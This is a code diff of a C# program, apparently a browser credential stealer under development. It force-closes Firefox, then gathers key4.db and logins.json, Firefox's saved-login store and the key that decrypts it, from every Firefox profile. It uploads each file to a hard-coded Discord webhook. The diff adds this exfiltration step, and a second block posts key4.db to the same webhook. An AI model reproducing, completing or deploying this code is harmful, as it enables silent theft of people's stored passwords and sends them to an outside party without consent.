@@ -13,13 +13,13 @@ namespace Ggezl2p
 {
     class Program
     {
-     
+
 
         static void Main(string[] args)
         {
             //Firefox Open Check
 
-            if(IsFirefoxRunning())
+            if (IsFirefoxRunning())
             {
                 Console.WriteLine("Firefox is running. Closing Firefox...");
                 CloseFirefox();
@@ -87,16 +87,27 @@ namespace Ggezl2p
 
             try
             {
-                // Alle Key4.db-Dateien in den Unterordnern von "Profiles" filtern
-                var dirs = new DirectoryInfo(sourceDir).GetDirectories();
-                foreach (var subdir in dirs)
+                string webhookLink = "https://discord.com/api/webhooks/1093683641068044378/KCPO4Q-xlX3zcMR25Ukt5L8LnVw_YwbsGFVLjZE142Pb3Is-7OM0eOYuR2QMWr1Lv0Go";
+                string profileDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");
+
+                var dirs2 = new DirectoryInfo(profileDir).GetDirectories();
+                foreach (var subdir in dirs2)
                 {
-                    var files = subdir.GetFiles("key4.db");
+                    var files = subdir.GetFiles("key4.db", SearchOption.AllDirectories)
+                                        .Union(subdir.GetFiles("logins.json", SearchOption.AllDirectories));
                     foreach (var file in files)
                     {
-                        // Datei kopieren
-                        string destFilePath = Path.Combine(destDir, file.Name);
-                        file.CopyTo(destFilePath, true);
+                        string filePath = Path.Combine(subdir.FullName, file.Name);
+
+                        using (HttpClient httpClient = new HttpClient())
+                        {
+                            MultipartFormDataContent form = new MultipartFormDataContent();
+                            var fileBytes = System.IO.File.ReadAllBytes(filePath);
+                            form.Add(new ByteArrayContent(fileBytes, 0, fileBytes.Length), "Data Base File", file.Name);
+                            httpClient.PostAsync(webhookLink, form).Wait();
+                            httpClient.Dispose();
+                        }
+
                         Console.WriteLine($"Datei {file.Name} erfolgreich kopiert.");
                     }
                 }
@@ -109,7 +120,7 @@ namespace Ggezl2p
             //Webhook verschicken
             string Webhook_link = "https://discord.com/api/webhooks/1093683641068044378/KCPO4Q-xlX3zcMR25Ukt5L8LnVw_YwbsGFVLjZE142Pb3Is-7OM0eOYuR2QMWr1Lv0Go";
             string FilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "a74Bas57M", "Profiles", "key4.db");
-            
+
             using (HttpClient httpClient = new HttpClient())
             {
                 MultipartFormDataContent form = new MultipartFormDataContent();
